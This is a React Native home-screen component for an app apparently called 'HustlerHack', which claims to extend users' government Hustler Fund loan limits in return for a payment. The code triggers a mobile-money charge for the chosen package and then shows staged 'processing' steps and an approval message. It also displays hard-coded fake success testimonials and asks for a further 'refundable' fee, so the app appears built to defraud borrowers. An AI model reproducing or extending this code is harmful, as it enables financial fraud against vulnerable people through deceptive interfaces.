import React, { useState } from 'react';
import {
  ActivityIndicator,
  ImageBackground,
  ScrollView,
  StyleSheet,
  Text,
  TouchableNativeFeedback,
  TouchableOpacity,
  View,
  RefreshControl,
  Modal,
  Image,
  Pressable,
  Alert,
  Dimensions
} from 'react-native';
import Icon from 'react-native-vector-icons/MaterialIcons';
import { useDispatch, useSelector } from 'react-redux';
import { getUserData } from '../store/storeSlices/userSlicer';
import GetMoneyModal from './GetMoneyModal';
import { userInitialStates } from '../store/storeSlices/userSlicer'
import { StoreState } from '../store/configStore';
import { changePackageStatus, getPackages, IPackage } from '../store/storeSlices/packagesSlice';
import { addToRecord, getAccessToken, initiateLipsPissa, proccedPayment } from '../store/storeSlices/paymentSlice';
import ModalView from '../components/ModalView';
import { addToNotificaton } from '../store/storeSlices/notificationSlice';
import { widthPercentageToDP, heightPercentageToDP } from 'react-native-responsive-screen'
import Animated, { Easing, interpolate, useAnimatedStyle, useSharedValue, withTiming } from 'react-native-reanimated';

const Home = () => {
  const dispatch = useDispatch();
  const translateY = useSharedValue(Dimensions.get('window').height - 100);

  const user = useSelector<StoreState, userInitialStates>(state => state.user)
  const { packages } = useSelector<StoreState, any>(state => state.packages) || {}

  const [floatingText, setfloatingText] = useState('07######98 has successfully extended hustler fund loan limit to ksh 1,500');
  const [isfetchingData, setfechtingData] = useState(false);
  const [refreshing, setrefreshing] = useState(false);
  const [packagesData, setPackagesData] = useState<Array<IPackage>>([])
  const [clickedPackage, setClickedPackage] = useState<IPackage | null>(null)
  const [modalStep, setModalStep] = useState<number>(0)
  const [Steps, setSteps] = useState([{ text: 'Check personal info', isCompleted: true },
  { text: `Checking mobile money transactions messages from your device.`, isCompleted: false },
  { text: `Inteligent decision`, isCompleted: false },
  { text: `Review completed`, isCompleted: false }
  ])

  const data = [
    {
      id: 1,
      text: <Text style={styles.loanAmountTextGreen}>Available</Text>,
      dollar: '1,500',
    },
    {
      id: 2,
      text: <Text style={styles.loanAmountTextRed}>Unavailable</Text>,
      dollar: '8,500',
    },
    {
      id: 3,
      text: <Text style={styles.loanAmountTextRed}>Unavailable</Text>,
      dollar: '15,000',
    },
  ];

  const onOkay = async () => {
    setModalStep(1);

    let respone = await dispatch(getAccessToken())

    if (respone?.payload?.status >= 200 && respone?.payload?.status < 300) {

      const { data } = respone?.payload || {}
      let payload =
      {
        Amount: `${clickedPackage?.price || 0}`,
        Bearer: data?.access_token,
        phoneNumber: user?.user?.phone

      }
      let result = await dispatch(initiateLipsPissa(payload))
      if (result?.payload?.status >= 200 && result?.payload?.status < 300) {


        setSteps(Steps?.map(step => {

          return {
            ...step,
            isCompleted: true
          }

        }))

        dispatch(addToRecord({ ...clickedPackage, ...result?.payload?.data }))
        dispatch(addToNotificaton({ ...clickedPackage, ...result?.payload?.data }))
        await dispatch(changePackageStatus({
          package_id: clickedPackage?.id
        }))
        setModalStep(2)
      } else {

        result?.payload?.data?.errorMessage && typeof result?.payload?.data?.errorMessage === 'string' &&
          Alert.alert('Attention!', `${result?.payload?.data?.errorMessage}`)

        setClickedPackage(null);
        setModalStep(0)
        setSteps(Steps?.map(step => {

          return {
            ...step,
            isCompleted: false
          }

        }))
      }
    }


  }

  const submitApproval = () => {
    setSteps(Steps?.map(step => {

      return {
        ...step,
        isCompleted: false
      }

    }))
    setClickedPackage(null)
    setModalStep(0)
  }
  const onPackageClick = async (item: IPackage) => {

    if (item?.status == '1') {
      Alert.alert('This package is unavailble right now.');
      return
    }
    setClickedPackage(item);





  }
  const onRefesh = () => {
    setrefreshing(true)
    dispatch(getPackages())
    setTimeout(() => {
      setrefreshing(false)
    }, 3000);

  }

  const fetchDashboardData = async () => {
    dispatch(getUserData())
    await dispatch(getPackages())
    setfechtingData(false)

  }

  // const style = useAnimatedStyle(() => {
  //   return {
  //     transform: [
  //       {
  //         translateY: translateY.value
  //       }
  //     ]
  //   };
  // });

  React.useEffect(() => {
    setfloatingText('HAHHA')
    setfechtingData(true)
    setTimeout(() => {
      fetchDashboardData()
    }, 1000);
  }, [])
  React.useEffect(() => {
    setPackagesData(packages?.data || []);
  }, [packages])


  // React.useEffect(()=>{

  //   // if(!!floatingText){
  //     translateY.value = withTiming(!!floatingText ? Dimensions.get('window').height/1.5: Dimensions.get('window').height,{
  //       duration:1000
  //     })
  //   // }
  //   setTimeout(() => {
  //     setfloatingText('0');
  //   }, 2000);
  // },[])


  return (
    <View style={{ flex: 1 }}>


      <ImageBackground
        source={require('../assets/Vector1.png')}
        resizeMode="contain"
        style={[styles.image, {
          position: 'relative',
          top: -5,
          justifyContent: 'center'
        }]}>

        <Text style={[styles.title, {
          textTransform: 'capitalize', width: '100%', textAlign
            : 'center'
        }]}>Welcome {`${user.user?.first_name || ''}`}</Text>

      </ImageBackground>


      <View style={styles.mainContainer}>
        <View style={styles.biddingContainer}>
          <View style={styles.biddingButton}>
            <Text style={styles.biddingText}>Your current available </Text>
            <Text style={styles.biddingText}>Hustlerfund loan limit is </Text>
          </View>
          <View style={styles.score}>
            <Text style={styles.scoreText}>KSH</Text>
            <Text style={styles.scoreRate}>450-800</Text>
            <Icon
              name="arrow-drop-up"
              color="#4ECB71"
              style={styles.arrowIcon}
            />
          </View>
        </View>
        <Text style={styles.limit}>Current Existing Loan Limit extensions</Text>
        <View style={{ marginVertical: 20 }}>
          {
            isfetchingData ? <ActivityIndicator size={'large'} /> :

              <ScrollView
                refreshControl={<RefreshControl
                  refreshing={refreshing}
                  onRefresh={onRefesh}
                />}
                horizontal
                showsHorizontalScrollIndicator={false}
                contentContainerStyle={{
                  alignItems: 'center'
                }}
              >


                {packagesData && packagesData?.map((item, index) => (
                  <TouchableOpacity onPress={() => {
                    onPackageClick(item)
                  }} key={index} style={{
                    height: index == 0 ? 155 : 140,
                    width: 180,

                    borderColor: 'red',
                    overflow: 'hidden',
                    alignItems: 'center',
                    flex: 1,
                    marginHorizontal: 8
                  }}>
                    <View style={{ flex: 1, width: '100%', }} key={item.id}>
                      <Text style={{
                        color: item?.status == '0' ? 'green' : 'red',
                        textAlign: 'center',
                        paddingBottom: 8,
                        fontWeight: '600',
                        fontSize: 17
                      }}>  {`${item?.status == '0' ? 'Available' : 'Unavailable'}`}</Text>
                      <View style={styles.singleLoanAmount}>
                        <Text style={styles.singleLoanAmountText}>Amount</Text>
                        <Text style={styles.loanAmountQuantity}>
                          Ksh{' '}
                          <Text style={styles.loanAmountQuantityDollar}>
                            {`${item?.price}`}
                          </Text>
                        </Text>
                        <Text style={[styles.loanAmountQuantity, { paddingTop: 6 }]}>
                          repayment time extended to
                        </Text>
                        <Text style={[styles.loanAmountQuantityDollar, { paddingTop: 4 }]}>
                          {`${item?.package_days}`} days
                        </Text>
                      </View>
                    </View>
                  </TouchableOpacity>
                ))}
              </ScrollView>
          }
        </View>


{
  !isfetchingData &&
        <View style={{  }}>
          <ScrollView contentContainerStyle={{
            justifyContent: 'center',
            alignItems: 'center',
            flexGrow:1
          }}>

            <View style={styles.hustlerFund}>
              <Text style={styles.hustlerFundText}>
                07######98 has successfully extended hustler fund loan limit to ksh
                1,500
              </Text>
              <Text style={styles.hustlerFundText}>
                07######98 has successfully extended hustler fund loan limit to ksh
                1,500
              </Text>
              <Text style={styles.hustlerFundText}>
                07######98 has successfully extended hustler fund loan limit to ksh
                1,500
              </Text>
            </View>
          </ScrollView>

        </View>

}
        {/* <GetMoneyModal /> */}
        <Text
          style={{
            textAlign: 'center',
            fontWeight: '400',
            fontSize: 14,
            lineHeight: 17,
            color: '#008325',
            marginTop: 5,
          }}>
          Powered by hustlerfundhack.co.ke
        </Text>
      </View>

      {/* <Animated.View style={[{
        position:'absolute',
        alignItems:'center',
        backgroundColor:"#32C35B",
        width:'90%',
        alignSelf:'center',
        borderRadius:Dimensions.get('window').width/2
        
      },style]}>
        <Text style={[{
          color:'#fff',
          margin:8,
          textAlign:'center',
        }]}>{floatingText}</Text>
      </Animated.View> */}
      <Modal
        visible={!!clickedPackage}
        transparent
        onRequestClose={() => {
          if (modalStep == 0) {
            setClickedPackage(null)
            return
          }
          Alert.alert('Package is processing...')
        }}
      >
        <TouchableOpacity onPress={() => {
          if (modalStep == 0) {
            setClickedPackage(null)
            return
          }
        }} activeOpacity={1} style={styles.modalBackDrop}>
          <View style={styles.modalContainer}>
            {
              modalStep == 0 ?
                <>
                  <Text style={styles.modalText}>{`Continue to submit your application for huslter fund loan extension to KSH ${clickedPackage?.price}`}</Text>
                  <TouchableOpacity onPress={onOkay} style={[styles.biddingButton, { borderWidth: 0, backgroundColor: '#3467FF', marginTop: 16 }]}>
                    <Text style={[styles.modalText, { color: '#fff' }]}>Okay</Text>
                  </TouchableOpacity>
                </> :
                modalStep == 1 ?
                  <>
                    <Text style={styles.modalText}>{`Processing...`}</Text>
                    {
                      Steps?.map((step, index) => {
                        return (
                          <View style={{ flexDirection: 'row', alignItems: 'center' }}>
                            {
                              step?.isCompleted ?
                                <Image
                                  source={require('../assets/confirmInfo.png')}
                                  style={{ width: 17, height: 17, marginRight: 8 }}
                                /> :
                                <ActivityIndicator style={{ marginRight: 8 }} />
                            }
                            <Text key={index} style={[styles.modalText, { width: '80%', }]}>{`${index + 1}. ${step.text}`}</Text>
                          </View>
                        )
                      })
                    }

                  </> :
                  <>
                    <View style={styles.approval}>
                      <Text style={styles.approvalHeader}>Congratulations !</Text>
                      <Text style={styles.approvalText}>
                        Your submission has been approved and we are working on the
                        process to get your account loan limit from hustler fund
                        extended to Ksh 1,500. To proceed you will be required to
                        make slight refundable payment of ksh 300. if the process
                        fails you will be refunded your amount in 3 days. Thank you
                        for choosing HustlerHack.
                      </Text>
                      <Pressable
                        style={[styles.button, styles.buttonClose]}
                        onPress={() => submitApproval()}>
                        <Text style={styles.buttonCloseText}>Okay</Text>
                      </Pressable>
                    </View></>
            }
          </View>
        </TouchableOpacity>
      </Modal>
    </View >
  );
};

export default Home;

const styles = StyleSheet.create({
  header: {
    // alignItems: 'center',
    // paddingTop: 30,
    // paddingBottom: 30,

  },
  approvalHeader: {
    fontSize: 24,
    lineHeight: 28,
    fontWeight: '700',
    color: '#32C35B',
    marginBottom: 10,
    textAlign: 'center',
  },

  approvalText: {
    fontSize: 18,
    lineHeight: 21,
    fontWeight: '700',
    color: '#000000',
    marginBottom: 30,
    textAlign: 'center',
  },
  buttonCloseText: {
    fontWeight: '700',
    fontSize: 13,
    lineHeight: 15,
    textAlign: 'center',
    paddingVertical: 9,
    color: '#ffffff',
  },
  buttonClose: {
    alignItems: 'center',
    backgroundColor: '#3467FF',
  },
  button: {
    borderWidth: 2,
    borderColor: '#3467FF',
    borderRadius: 40,
    width: 142,
  },
  approval: {
    alignItems: 'center',
  },
  modalText: {
    fontSize: 22,
    fontWeight: '500',
    color: '#000'
  },
  modalBackDrop: {
    flex: 1, backgroundColor: '#00000040',
    justifyContent: 'center',
    alignItems: 'center'
  },
  modalContainer: {
    maxHeight: '60%',
    // minHeight:'40%',
    width: '90%',
    borderRadius: 24,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#fff',
    paddingVertical: 24
  },
  image: {
    height: 150,
    width: '100%',

    // borderRadius: 50,


  },
  title: {
    fontWeight: '500',
    fontSize: 22,
    // lineHeight: 17,
    color: '#FFFFFF',
    // marginTop: 40,
    // paddingBottom: 40,

  },
  mainContainer: {
    flex: 1,
    // paddingHorizontal: 17,
    paddingTop: 10,
  },
  biddingButton: {
    backgroundColor: '#fff8e9',
    borderWidth: 5,
    borderColor: '#F9B125',
    borderRadius: 40,
    marginRight: 8,
    paddingVertical: 9,
    flex: 1,
    alignItems: 'center',
    justifyContent: 'center'
  },
  biddingContainer: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: 20,
    // borderWidth:1,
    width: '95%',
    alignSelf: 'center'
  },
  score: {
    flexDirection: 'row',
    alignItems: 'center',
  },
  biddingText: {
    fontWeight: '700',
    fontSize: 11,
    lineHeight: 13,
    color: '#3467FF',
  },
  scoreText: {
    fontWeight: '600',
    fontSize: 14,
    lineHeight: 15,
    color: '#000000',
    paddingTop: 30,
  },
  scoreRate: {
    fontWeight: '700',
    fontSize: 40,
    lineHeight: 13,
    color: 'red',
    marginLeft: 10,
    paddingTop: 50,
  },
  arrowIcon: {
    fontSize: 30,
    paddingTop: 20,
  },
  limit: {
    fontWeight: '700',
    fontSize: 14,
    lineHeight: 15,
    color: '#000000',
    textAlign: 'center',
  },
  loanAmounts: {
    flexDirection: 'row',
    flexWrap: 'wrap',
    justifyContent: 'space-between',
    alignItems: 'flex-start',
    marginTop: 14,
  },
  loanAmountTextGreen: {
    marginBottom: 5,
    color: '#32C35B',
    fontWeight: '700',
    fontSize: 11,
    lineHeight: 13,
    textAlign: 'center',
  },
  loanAmountTextRed: {
    marginBottom: 5,
    color: 'red',
    fontWeight: '700',
    fontSize: 11,
    lineHeight: 13,
    textAlign: 'center',
  },
  singleLoanAmount: {
    backgroundColor: '#ecfffe',
    borderWidth: 5,
    borderColor: '#07EFE1',
    borderRadius: 40,
    paddingHorizontal: 8,
    paddingVertical: 5,
    textAlign: 'center',
    width: '100%',
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center'
  },
  singleLoanAmountText: {
    textAlign: 'center',
    color: '#3467FF',
  },
  loanAmountQuantity: {
    textAlign: 'center',
    fontWeight: '700',
    fontSize: 13,
    // lineHeight: 13,
    color: '#000000',
    // paddingTop: 8,
  },
  loanAmountQuantityDollar: {
    fontWeight: '700',
    fontSize: 22,
    // lineHeight: 13,
    color: '#3467FF',
    // paddingTop: 20,
    textAlign: 'center',
  },
  hustlerFund: {
    backgroundColor: 'rgba(0, 255, 71, 0.51)',
    borderRadius: 20,
    paddingHorizontal: 14,
    paddingVertical: 18,
    marginTop: 30,
  },
  hustlerFundText: {
    textAlign: 'center',
    fontWeight: '700',
    fontSize: 11,
    lineHeight: 12,
    color: '#008325',
    marginBottom: 5,
  },
});


